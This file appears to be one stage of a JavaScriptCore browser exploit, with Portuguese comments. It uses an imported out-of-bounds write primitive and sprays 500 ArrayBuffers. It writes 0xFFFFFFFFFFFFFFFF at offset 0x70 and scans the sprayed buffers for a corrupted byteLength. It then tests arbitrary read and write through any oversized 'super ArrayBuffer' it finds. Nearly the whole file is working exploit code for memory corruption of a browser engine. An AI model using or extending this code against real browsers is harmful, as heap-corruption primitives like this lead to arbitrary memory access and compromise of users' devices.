// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_SPRAY_AB_AND_CHECK_SIZE = "sprayABAndCheckSizeCorruption_v15a";

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSync";
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // O que será escrito

const NUM_SPRAY_AB_OBJECTS = 500; // Aumentar bastante o número de ArrayBuffers pulverizados
const SPRAY_AB_SIZE = 128;      // Tamanho dos ArrayBuffers pulverizados (pode variar)
const TARGET_CORRUPTED_SIZE = 0xFFFFFFFF; // Se o size for corrompido para isto

// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
let sprayedVictimABs = [];
let getter_sync_flag_v15a = false;

export async function sprayAndInvestigateObjectExposure() { // Mantendo nome da exportação
    logS3(`--- Iniciando ${FNAME_SPRAY_AB_AND_CHECK_SIZE}: Spray ArrayBuffers, Trigger 0x70, Checar Corrupção de Tamanho ---`, "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);
    getter_sync_flag_v15a = false;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);

        // FASE 1: Pulverizar objetos ArrayBuffer
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_AB_OBJECTS} objetos ArrayBuffer(${SPRAY_AB_SIZE})...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        sprayedVictimABs = [];
        for (let i = 0; i < NUM_SPRAY_AB_OBJECTS; i++) {
            try {
                const ab = new ArrayBuffer(SPRAY_AB_SIZE);
                // Marcar o buffer para possível identificação (opcional)
                if (SPRAY_AB_SIZE >= 4) new DataView(ab).setUint32(0, 0xDAF0DAF0 + i, true);
                sprayedVictimABs.push(ab);
            } catch (e) {
                logS3(`Erro ao criar ArrayBuffer no spray, índice ${i}: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                // Continuar mesmo que alguns falhem, mas logar.
            }
        }
        logS3(`Pulverização de ${sprayedVictimABs.length} ArrayBuffers concluída.`, "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        await PAUSE_S3(100); // Pausa maior para estabilização da heap


        // FASE 2: Configurar objeto com getter (apenas para sincronização e log)
        const getterObject = {
            get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
                logS3(`    >>>> [GETTER ${GETTER_CHECKPOINT_PROPERTY_NAME} ACIONADO!] <<<<`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                getter_sync_flag_v15a = true;
                return "GetterSyncValue";
            }
        };

        // FASE 3: Realizar a escrita OOB (trigger) no oob_array_buffer_real
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        // NÃO estamos plantando m_vector/m_length aqui, pois o alvo da corrupção é um JSArrayBuffer pulverizado.
        // A escrita em 0x70 é a única "preparação" no oob_array_buffer_real.
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        await PAUSE_S3(100); 

        // FASE 4: Chamar JSON.stringify para acionar o getter (e qualquer efeito colateral da corrupção + stringify)
        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        try {
            JSON.stringify(getterObject);
        } catch (e) {
            logS3(`Erro durante JSON.stringify: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        }
        if (getter_sync_flag_v15a) {
            logS3("  Getter foi acionado como esperado.", "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        } else {
            logS3("  ALERTA: Getter NÃO foi acionado!", "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        }
        await PAUSE_S3(200); // Pausa adicional para efeitos da corrupção se propagarem

        // FASE 5: Verificar TODOS os ArrayBuffers pulverizados por mudança no byteLength
        logS3(`FASE 5: Verificando ${sprayedVictimABs.length} ArrayBuffers pulverizados por corrupção no byteLength...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        let corruptedABsFound = 0;
        let potentialSuperABIndex = -1;
        for (let i = 0; i < sprayedVictimABs.length; i++) {
            const currentAB = sprayedVictimABs[i];
            if (!currentAB) continue;

            let currentLength = 0;
            try {
                currentLength = currentAB.byteLength;
            } catch (e) {
                logS3(`    Erro ao acessar byteLength do ArrayBuffer pulverizado índice [${i}]: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                // Considerar este como potencialmente corrompido se o acesso falhar.
                document.title = `CORRUPÇÃO AB SPRAY (ERRO BL) Idx ${i}!`;
                corruptedABsFound++;
                continue;
            }

            if (currentLength !== SPRAY_AB_SIZE) {
                logS3(`    !!! CORRUPÇÃO DE TAMANHO DETECTADA no ArrayBuffer pulverizado índice [${i}] !!!`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                logS3(`      byteLength alterado de ${SPRAY_AB_SIZE} para ${currentLength} (${toHex(currentLength)})`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                corruptedABsFound++;
                document.title = `CORRUPÇÃO AB SPRAY (${corruptedABsFound})!`;

                if (currentLength === TARGET_CORRUPTED_SIZE || currentLength > 0x10000000) { // 0x10000000 == 256MB
                    logS3(`      POTENCIAL SUPER ArrayBuffer encontrado! byteLength: ${toHex(currentLength)}`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                    potentialSuperABIndex = i;
                    // Tentar usar este ArrayBuffer para OOB
                    try {
                        const dv = new DataView(currentAB);
                        // Tentar ler/escrever em um offset grande, mas seguro dentro do esperado TARGET_CORRUPTED_SIZE
                        const testOffset = 0x1000; // Um offset para teste
                        const testRead = dv.getUint32(testOffset, true);
                        logS3(`      Leitura de teste do Super AB @${toHex(testOffset)}: ${toHex(testRead)}`, "leak", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                        dv.setUint32(testOffset, 0xFEEDBEEF, true);
                        const testReadAfterWrite = dv.getUint32(testOffset, true);
                        if (testReadAfterWrite === 0xFEEDBEEF) {
                            logS3(`      SUCESSO: Escrita/Leitura no Super AB @${toHex(testOffset)} funcionou!`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                            document.title = `SUPER AB FUNCIONAL Idx ${i}!`;
                        } else {
                            logS3(`      FALHA: Escrita/Leitura no Super AB @${toHex(testOffset)} falhou. Lido: ${toHex(testReadAfterWrite)}`, "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                        }
                    } catch (e_dv) {
                        logS3(`      Erro ao tentar usar DataView no ArrayBuffer corrompido: ${e_dv.message}`, "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                    }
                }
            }
        }

        if (corruptedABsFound > 0) {
            logS3(`  Total de ${corruptedABsFound} ArrayBuffers pulverizados encontrados com corrupção de tamanho.`, "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        } else {
            logS3("  Nenhuma corrupção de tamanho detectada nos ArrayBuffers pulverizados.", "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
            document.title = "Nenhuma Corrupção AB Spray";
        }

        logS3("INVESTIGAÇÃO DE CORRUPÇÃO DE TAMANHO DE ArrayBuffer CONCLUÍDA.", "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AB_AND_CHECK_SIZE}: ${e.message}`, "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
        document.title = `${FNAME_SPRAY_AB_AND_CHECK_SIZE} FALHOU!`;
    } finally {
        sprayedVictimABs = []; // Limpar array
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SPRAY_AB_AND_CHECK_SIZE} Concluído ---`, "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);
    }
}
